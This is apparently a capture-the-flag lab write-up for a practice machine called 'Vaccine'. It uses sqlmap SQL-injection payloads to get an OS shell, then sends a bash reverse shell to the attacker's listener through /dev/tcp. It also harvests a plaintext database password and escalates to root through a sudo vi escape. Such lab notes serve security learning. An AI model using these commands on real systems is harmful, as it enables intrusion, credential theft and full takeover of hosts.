From the 'MegaCorp Car Catalogue' search bar (see [[Vaccine/03 - Website/03 - website|03 - website]]), the attacker can run `sqlmap` and get an os shell.

# Sqlmap shell
```
┌──(kali㉿kali)-[~]
└─$ sqlmap --cookie="PHPSESSID=mudfd7ug5ugl1dfqme3lgap3ha" --os-shell -u http://10.129.66.143/dashboard.php?search=foo
        ___
       __H__                                                                 
 ___ ___[,]_____ ___ ___  {1.9.6#stable}                                     
|_ -| . [.]     | .'| . |                                                    
|___|_  [(]_|_|_|__,|  _|                                                    
      |_|V...       |_|   https://sqlmap.org                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:17:21 /2025-08-22/

[06:17:21] [INFO] testing connection to the target URL
[06:17:21] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[06:17:21] [INFO] testing if the target URL content is stable
[06:17:22] [INFO] target URL content is stable
[06:17:22] [INFO] testing if GET parameter 'search' is dynamic
[06:17:22] [WARNING] GET parameter 'search' does not appear to be dynamic
[06:17:22] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[06:17:22] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[06:17:22] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 

[06:17:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:17:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
[06:17:39] [INFO] testing 'Generic inline queries'
[06:17:39] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'                                                            
[06:17:40] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable                    
[06:17:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                           
[06:17:40] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable                                              
[06:17:40] [INFO] testing 'PostgreSQL inline queries'
[06:17:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:17:40] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[06:17:52] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable                                            
[06:17:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[06:18:02] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable                                                 
[06:18:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=foo' AND (SELECT (CASE WHEN (9794=9794) THEN NULL ELSE CAST((CHR(101)||CHR(114)||CHR(82)||CHR(104)) AS NUMERIC) END)) IS NULL-- Lvwu

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=foo' AND 5234=CAST((CHR(113)||CHR(120)||CHR(98)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (5234=5234) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(122)||CHR(118)||CHR(113)) AS NUMERIC)-- LElT

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=foo';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=foo' AND 2370=(SELECT 2370 FROM PG_SLEEP(5))-- bZWL
---
[06:18:13] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[06:18:14] [INFO] fingerprinting the back-end DBMS operating system
[06:18:15] [INFO] the back-end DBMS operating system is Linux
[06:18:15] [INFO] testing if current user is DBA
[06:18:15] [INFO] retrieved: '1'
[06:18:16] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[06:18:16] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 

```

# Digging around
```
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] 

[06:20:47] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[06:20:47] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] a
[06:21:03] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=1...
command standard output: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)' 
```

Some output looks strange. Time to upgrade the shell.

## Upgrade the shell
```
### attacker - listen

### target - send bash payload
os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.23/1337 0>&1"
[06:34:37] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[06:35:02] [WARNING] the SQL query provided does not return any output
[06:35:02] [INFO] retrieved: 
No output
os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.23/1337 0>&1"

### attacker - connected
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.66.143] 54400
bash: cannot set terminal process group (2466): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ pwd
pwd

### upgrade the shell to have autocomplete
postgres@vaccine:/var/lib/postgresql/11/main$ which python3
which python3
/usr/bin/python3
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ain$ python3 -c 'import pty;pty.spawn("/bin/bash")'
postgres@vaccine:/var/lib/postgresql/11/main$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337
                               stty size
0 0
postgres@vaccine:/var/lib/postgresql/11/main$ ls -l 
base/                 pg_replslot/          pg_twophase/
global/               pg_serial/            PG_VERSION

```

# Found postgres credentials
```
postgres@vaccine:/var/www/html$ grep -rin passw*
dashboard.php:41:         $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
index.php:4:  if(isset($_POST['username']) && isset($_POST['password'])) {
index.php:5:    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
index.php:33:        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
index.php:34:        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
style.css:123:.form input[type='password'],
style.css:151:.login input[type='password'],
style.css:168:.login input[type='password'],
style.css:175:.login input[type='password']:focus,
style.css:176:.login input[type='password']:hover,

```

- postgres
- P@s5w0rd!
# SSH as postgres user
```
postgres@vaccine:~$ id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)

postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET",
    env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

## vi exploitation
Having a hard time getting this to work...
https://gtfobins.github.io/gtfobins/vi/#sudo
```
postgres@vaccine:/tmp/ignore$ sudo vi -c ':!/bin/sh' /dev/null
Sorry, user postgres is not allowed to execute '/usr/bin/vi -c :!/bin/sh /dev/null' as root on vaccine.
postgres@vaccine:/tmp/ignore$ which vi
/usr/bin/vi
postgres@vaccine:/tmp/ignore$ which bash
/usr/bin/bash
postgres@vaccine:/tmp/ignore$ sudo /usr/bin/vi -c ':!/usr/bin/bash' /dev/null
Sorry, user postgres is not allowed to execute '/usr/bin/vi -c :!/usr/bin/bash /dev/null' as root on vaccine.

```
Looks like the only file that can be sudo vi'd is the pg_hba.conf file.
```
postgres@vaccine:/tmp/ignore$ sudo vi /etc/postgresql/11/main/pg_hba.conf

## in vi, go into command mode, paste, then hit enter
:/bin/bash

root@vaccine:/tmp/ignore# id
uid=0(root) gid=0(root) groups=0(root)
```
## psql exploration
```
postgres@vaccine:/tmp/ignore$ psql -U postgres
psql (11.7 (Ubuntu 11.7-0ubuntu0.19.10.1))
Type "help" for help.

postgres=# 
```